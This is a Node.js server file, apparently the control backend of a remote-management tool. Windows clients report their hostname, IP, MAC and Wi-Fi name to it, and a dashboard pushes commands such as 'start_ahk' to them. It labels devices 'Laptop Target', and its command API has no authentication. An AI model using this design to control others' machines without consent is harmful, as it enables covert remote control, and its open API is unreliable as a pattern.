const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json());

const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

let databasePerangkat = [];

let klienOnlineLive = new Map();

function kirimUpdateKeSemuaDashboard() {
  try {
    const daftarDevicesLive = Array.from(klienOnlineLive.values()).map(p => ({
      id: p.id || '',
      ahkEnabled: p.ahkEnabled || false,
      hostname: p.hostname || '-',
      model: p.model || '-',
      wifi: p.wifi || '-',
      ip: p.ip || '-',
      mac: p.mac || '-'
    }));

    const payload = JSON.stringify({
      type: 'device_list',
      devices: daftarDevicesLive
    });

    wss.clients.forEach((client) => {
      if (client && client.readyState === WebSocket.OPEN) {
        client.send(payload);
      }
    });
  } catch (err) {
    console.error('⚠️ Gagal melakukan broadcast ke dashboard:', err.message);
  }
}

wss.on('connection', (ws) => {
  console.log('🔌 Seseorang terhubung (Dashboard Web atau Client.exe)');
  kirimUpdateKeSemuaDashboard();

  ws.on('message', (message) => {
    try {
      const data = JSON.parse(message);

      if (data && data.id) {
        const deviceId = data.id.toString().trim().toLowerCase();
        
        klienOnlineLive.set(deviceId, {
          id: data.id.toString().trim(),
          ahkEnabled: typeof data.ahkEnabled === 'boolean' ? data.ahkEnabled : false,
          hostname: data.hostname || 'Windows Client',
          model: data.model || '-',
          wifi: data.wifi || '-',
          ip: data.ip || '-',
          mac: data.mac || '-',
          wsInstance: ws, 
          lastSeen: Date.now()
        });

        kirimUpdateKeSemuaDashboard();
      }
    } catch (err) {
      console.error('❌ Gagal memproses data masuk (Paket Rusak):', err.message);
    }
  });

  ws.on('close', () => {
    try {
      for (let [id, perangkat] of klienOnlineLive.entries()) {
        if (perangkat && perangkat.wsInstance === ws) {
          klienOnlineLive.delete(id);
          console.log(`❌ Perangkat [${id}] memutus koneksi.`);
          break;
        }
      }
      kirimUpdateKeSemuaDashboard();
    } catch (err) {
      console.error('⚠️ Gagal membersihkan sesi koneksi tutup:', err.message);
    }
  });

  ws.on('error', (err) => {
    console.error('🔥 WebSocket Socket Error:', err.message);
    try {
      ws.close();
    } catch (e) {}
  });
});

process.on('uncaughtException', (err) => {
  console.error('🚨 ERROR FATAL DIALAMI SERVER (Tetap Bertahan):', err.message);
});

process.on('unhandledRejection', (reason, promise) => {
  console.error('🚨 REJEKSI PROMISE TIDAK TERTANGANI:', reason);
});

app.get('/api/devices', (req, res) => {
  res.json({ devices: databasePerangkat });
});

app.post('/api/devices', (req, res) => {
  try {
    const { serial, name, model, wifi, ip, mac } = req.body;
    if (!serial) return res.status(400).json({ error: 'Serial is required' });

    const kunciSerial = serial.toString().trim().toLowerCase();
    const indeksAman = databasePerangkat.findIndex(p => p.serial.toString().trim().toLowerCase() === kunciSerial);
    
    const dataBaru = { 
      serial: serial.toString().trim(), 
      name: name || 'Laptop Target', 
      model: model || '-', 
      wifi: wifi || '-', 
      ip: ip || '-', 
      mac: mac || '-', 
      ahkEnabled: false 
    };

    if (indeksAman > -1) {
      databasePerangkat[indeksAman] = { ...databasePerangkat[indeksAman], ...dataBaru };
    } else {
      databasePerangkat.push(dataBaru);
    }

    res.json({ success: true, message: 'Device locked to cloud master' });
  } catch (e) {
    res.status(500).json({ error: 'Internal transaction error' });
  }
});

app.put('/api/devices/:id', (req, res) => {
  try {
    const targetSerial = req.params.id.toString().trim().toLowerCase();
    const indeks = databasePerangkat.findIndex(p => p.serial.toString().trim().toLowerCase() === targetSerial);
    
    if (indeks > -1) {
      databasePerangkat[indeks] = { ...databasePerangkat[indeks], ...req.body };
      res.json({ success: true });
    } else {
      res.status(404).json({ error: 'Device record not found' });
    }
  } catch (e) {
    res.status(500).json({ error: 'Mutation error' });
  }
});

app.delete('/api/devices/:id', (req, res) => {
  try {
    const targetSerial = req.params.id.toString().trim().toLowerCase();
    databasePerangkat = databasePerangkat.filter(p => p.serial.toString().trim().toLowerCase() !== targetSerial);
    res.json({ success: true });
  } catch (e) {
    res.status(500).json({ error: 'Deletion error' });
  }
});

app.post('/api/command', (req, res) => {
  try {
    const { deviceId, command } = req.body; 
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });

    const targetKlien = klienOnlineLive.get(deviceId.toString().trim().toLowerCase());

    if (targetKlien && targetKlien.wsInstance && targetKlien.wsInstance.readyState === WebSocket.OPEN) {
      targetKlien.wsInstance.send(JSON.stringify({ action: command }));
      targetKlien.ahkEnabled = (command === 'start_ahk');
      kirimUpdateKeSemuaDashboard();

      return res.json({ success: true, message: 'Signal successfully deployed' });
    }

    res.status(404).json({ error: 'Device node is currently offline' });
  } catch (e) {
    res.status(500).json({ error: 'Command dispatch system error' });
  }
});

app.post('/api/devices/import', (req, res) => {
  const { devices } = req.body;
  if (Array.isArray(devices)) {
    databasePerangkat = devices;
    res.json({ success: true });
  } else {
    res.status(400).json({ error: 'Invalid data format' });
  }
});

const PORT = process.env.PORT || 8080;
server.listen(PORT, () => {
  console.log(`🚀 Master Engine Server operating safely on port: ${PORT}`);
});